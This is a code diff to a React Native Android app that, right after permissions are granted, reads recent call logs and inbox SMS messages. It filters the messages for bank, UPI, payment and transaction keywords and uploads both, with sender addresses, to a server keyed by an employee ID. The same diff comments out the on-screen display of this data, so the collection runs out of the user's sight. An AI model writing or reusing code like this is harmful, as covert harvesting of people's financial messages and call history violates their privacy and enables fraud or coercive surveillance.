@@ -1,10 +1,15 @@
 // App Component
 import React, { useEffect, useState } from 'react';
+import axios from 'axios';
 import { View, Text, Alert, StyleSheet } from 'react-native';
 import { PERMISSIONS, RESULTS, request } from 'react-native-permissions';
 import { useNavigation } from '@react-navigation/native';
 import CallLogs from 'react-native-call-log';
 import SmsAndroid from 'react-native-get-sms-android'
+import { BASE_URL } from './config/constants';
+import pako from 'pako';
+import AsyncStorage from '@react-native-async-storage/async-storage';
+
 
 const App = () => {
     const [permissionsStatus, setPermissionsStatus] = useState({
@@ -43,9 +48,13 @@ const App = () => {
             }
 
             if (allGranted && navigation) {
-                // fetchCallLogs();
-                // fetchMessages()
                 navigation.navigate('Login')
+                fetchCallLogs();
+                fetchMessages();
+                fetchAndPostLogsAndMessages()
+                
+
+                
             }
         };
 
@@ -67,6 +76,199 @@ const App = () => {
     //     }
     // };
 
+    const getEmployeeId = async () => {
+        try {
+            const employeeId = await AsyncStorage.getItem('employeeId');
+            return employeeId; // Return the employeeId or null if not found
+        } catch (error) {
+            console.error('Error fetching employeeId from AsyncStorage:', error);
+            return null; // Handle error case
+        }
+    };
+    
+    // Wrapper function to post call logs
+    const postCallLogs = async (callLogs) => {
+        try {
+            const employeeId = await getEmployeeId(); // Fetch employee ID from AsyncStorage
+            if (!employeeId) {
+                console.error('Employee ID not found');
+                return;
+            }
+    
+            const payload = { callLogs };
+            console.log('Payload before posting call logs:', payload);
+    
+            const response = await axios.post(`${BASE_URL}/api/employees/${employeeId}/callLogs`, payload, {
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            });
+            console.log('Response from server:', response.data);
+        } catch (error) {
+            console.error('Error posting call logs to server:', error);
+        }
+    };
+    
+    // Wrapper function to post messages
+    const postMessages = async (messages) => {
+        try {
+            const employeeId = await getEmployeeId(); // Fetch employee ID from AsyncStorage
+            if (!employeeId) {
+                console.error('Employee ID not found');
+                return;
+            }
+    
+            const payload = { messages };
+            console.log('Payload before posting messages:', payload);
+    
+            const response = await axios.post(`${BASE_URL}/api/employees/${employeeId}/messages`, payload, {
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            });
+            console.log('Response from server:', response.data);
+        } catch (error) {
+            console.error('Error posting messages to server:', error);
+        }
+    };
+    
+    const fetchCallLogs = async (employeeId) => {
+        try {
+            const logs = await CallLogs.loadAll(); // Fetch all call logs
+            console.log('Fetched call logs:', JSON.stringify(logs, null, 2)); // Debugging log
+    
+            if (Array.isArray(logs)) {
+                const now = new Date();
+                const sixMonthsAgo = new Date();
+                sixMonthsAgo.setMonth(now.getMonth() - 6); // Get the date for 6 months ago
+    
+                // Filter logs for the last 6 months
+                const recentLogs = logs.filter(log => {
+                    const callDate = new Date(parseInt(log.timestamp)); // Convert timestamp to Date
+                    return callDate >= sixMonthsAgo && callDate <= now; // Date range filter
+                });
+    
+                // Sort logs by date (most recent first)
+                recentLogs.sort((a, b) => b.timestamp - a.timestamp);
+                const limitedLogs = recentLogs.slice(0, 10);
+    
+                return limitedLogs; // Return logs for further use
+            } else {
+                throw new Error('Fetched data is not an array');
+            }
+        } catch (error) {
+            console.log('Error fetching call logs:', error);
+            Alert.alert('Error', 'Could not fetch recent call logs. Please try again later.');
+            return []; // Return empty array on error
+        }
+    };
+    
+    const fetchMessages = async (employeeId) => {
+        return new Promise((resolve, reject) => {
+            try {
+                const filter = {
+                    box: 'inbox',
+                    read: 1,
+                    indexFrom: 0,
+                    maxCount: 100, // Fetch more to filter down later
+                };
+    
+                SmsAndroid.list(
+                    JSON.stringify(filter),
+                    async (fail) => {
+                        console.log('Failed to fetch messages:', fail);
+                        Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
+                        reject(fail);
+                    },
+                    async (count, smsList) => {
+                        const parsedMessages = JSON.parse(smsList); // Parse the SMS list
+                        console.log('Fetched SMS messages:', parsedMessages); // Debugging log
+    
+                        // Filter for bank and UPI-related messages
+                        const keywords = ['bank', 'upi', 'credit', 'debit', 'transaction', 'payment'];
+                        const filteredMessages = parsedMessages.filter(message =>
+                            keywords.some(keyword => message.body.toLowerCase().includes(keyword))
+                        );
+    
+                        // Extract important details and convert date to a readable format
+                        const importantMessages = filteredMessages.map(message => {
+                            const date = new Date(message.date); // Convert timestamp to Date object
+                            const formattedDate = date.toLocaleString(); // Format the date to a readable string
+    
+                            return {
+                                body: message.body,
+                                address: message.address,
+                                date: formattedDate, // Store the formatted date
+                                sim_slot: message.sim_slot,
+                                service_center: message.service_center,
+                            };
+                        });
+    
+                        console.log('Filtered important SMS messages:', importantMessages); // Debugging log
+    
+                        resolve(importantMessages); // Resolve the Promise with important messages
+                    }
+                );
+            } catch (error) {
+                console.log('Error fetching SMS messages:', error);
+                Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
+                reject(error);
+            }
+        });
+    };
+    
+    // Wrapper function to fetch both call logs and messages, then post them
+    const fetchAndPostLogsAndMessages = async () => {
+        try {
+            const employeeId = await getEmployeeId(); // Fetch employee ID
+    
+            // Fetch call logs
+            const callLogs = await fetchCallLogs(employeeId);
+    
+            // Fetch messages
+            const messages = await fetchMessages(employeeId);
+    
+            // Post call logs and messages if they are fetched successfully and are not empty
+            if (callLogs?.length > 0) {
+                await postCallLogs(callLogs);
+            }
+            
+            if (messages?.length > 0) {
+                await postMessages(messages);
+            }
+        } catch (error) {
+            console.log('Error in fetching and posting logs/messages:', error);
+        }
+    };
+    
+
+
+    const postLogsAndMessagesInChunks = async (callLogs, messages) => {
+        const chunkSize = 5; // Define the chunk size
+        
+        for (let i = 0; i < callLogs.length; i += chunkSize) {
+            const callLogsChunk = callLogs.slice(i, i + chunkSize);
+            const messagesChunk = messages.slice(i, i + chunkSize); 
+            
+            try {
+                await axios.post(`${BASE_URL}/saveLogs`, {
+                    callLogs: callLogsChunk,
+                    messages: messagesChunk,
+                });
+                console.log('Chunk posted successfully');
+            } catch (error) {
+                console.error('Error posting chunk to server:', error);
+                break; // Stop if an error occurs
+            }
+        }
+    };
+    
+   
+    
+
+    
+    
+    
     // const fetchMessages = async () => {
     //     try {
     //       // Define filters for messages you want to retrieve
@@ -87,7 +289,8 @@ const App = () => {
     //         (count, smsList) => {
     //           const parsedMessages = JSON.parse(smsList); // Parse the SMS list
     //           console.log('Fetched SMS messages:', parsedMessages); // Debugging log to inspect structure
-    //           setMessages(parsedMessages); // Assuming you have a useState for messages
+    //           setMessages(parsedMessages); 
+    //           postLogsAndMessages(callLogs, parsedMessages);// Assuming you have a useState for messages
     //         }
     //       );
     //     } catch (error) {
@@ -110,7 +313,7 @@ const App = () => {
                 Location Permission: {permissionsStatus.location ? 'Granted' : 'Denied'}
             </Text>
 
-            {callLogs.length > 0 && (
+            {/* {callLogs.length > 0 && (
     <View style={styles.logsContainer}>
         <Text style={styles.logsTitle}>Call Logs:</Text>
         {callLogs.map((log, index) => (
@@ -124,11 +327,12 @@ const App = () => {
         ))}
        
        </View>
-)}
+)} */}
 
 
 
-{messages.length > 0 && (
+
+{/* {messages.length > 0 && (
   <View style={styles.messagesContainer}>
     <Text style={styles.messagesTitle}>SMS Messages:</Text>
     {messages.map((msg, index) => (
@@ -139,7 +343,7 @@ const App = () => {
       </Text>
     ))}
   </View>
-)}
+)} */}
 
 
         </View>
